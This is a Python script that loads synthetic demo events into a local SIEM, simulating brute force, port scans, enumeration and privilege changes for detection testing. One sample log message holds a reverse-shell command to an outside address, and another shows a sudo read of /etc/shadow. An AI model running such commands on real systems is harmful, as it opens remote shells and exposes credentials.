#!/usr/bin/env python3
import json, os, random, sys, time
from datetime import datetime, timezone
from urllib.request import Request, urlopen

BASE = os.getenv('SIEM_URL','http://127.0.0.1:8000')
KEY = os.getenv('SIEM_API_KEY','') or os.getenv('SIEM_INGEST_API_KEY','')

def post(path,obj):
    data=json.dumps(obj).encode()
    headers={'Content-Type':'application/json'}
    if KEY: headers['X-API-Key']=KEY
    req=Request(BASE+path,data=data,headers=headers,method='POST')
    with urlopen(req,timeout=5) as r: return json.loads(r.read())

def now(): return datetime.now(timezone.utc).isoformat()

samples=[]
# Normal telemetry
for i in range(20):
    samples.append({"timestamp":now(),"host":"web-01","event_type":"auth","message":f"Accepted password for analyst from 10.0.0.{20+i%3}","src_ip":f"10.0.0.{20+i%3}","user":"analyst"})
# SSH brute force
for i in range(6):
    samples.append({"timestamp":now(),"host":"srv-01","event_type":"ssh_failed","message":"Failed password for invalid user admin from 203.0.113.77 port 51422 ssh2","src_ip":"203.0.113.77","user":"admin"})
# Privileged command
samples.append({"timestamp":now(),"host":"srv-01","event_type":"auth","message":"sudo: analyst : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow","user":"analyst"})
# Reverse shell indicator
samples.append({"timestamp":now(),"host":"web-01","event_type":"process","severity":"high","message":"bash -c bash -i >& /dev/tcp/198.51.100.10/4444 0>&1","user":"www-data"})
post('/api/ingest/linux',samples)

# Windows privileged group change
post('/api/ingest/windows',{
  "timestamp":now(),"Computer":"WIN-DC01","EventID":4732,"TargetUserName":"intern-user","message":"A member was added to a security-enabled local group: Administrators"
})

# Suricata alert
post('/api/ingest/suricata',{
  "timestamp":now(),"event_type":"alert","src_ip":"198.51.100.44","src_port":55001,"dest_ip":"10.0.0.15","dest_port":443,
  "proto":"TCP","alert":{"severity":1,"signature":"ET EXPLOIT Possible Web Application Attack","signature_id":900001}
})

# Port scan as flow events
flows=[]
for p in range(20,35):
    flows.append({"timestamp":now(),"event_type":"flow","src_ip":"198.51.100.88","dest_ip":"10.0.0.15","dest_port":p,"proto":"TCP","flow":{"pkts_toserver":1}})
post('/api/ingest/suricata',flows)

# Web enumeration indicator
post('/api/events',{"timestamp":now(),"source":"api","host":"nginx-01","event_type":"http","src_ip":"203.0.113.55","message":"GET /admin HTTP/1.1 User-Agent: feroxbuster/2.11"})
print('Demo telemetry loaded into', BASE)
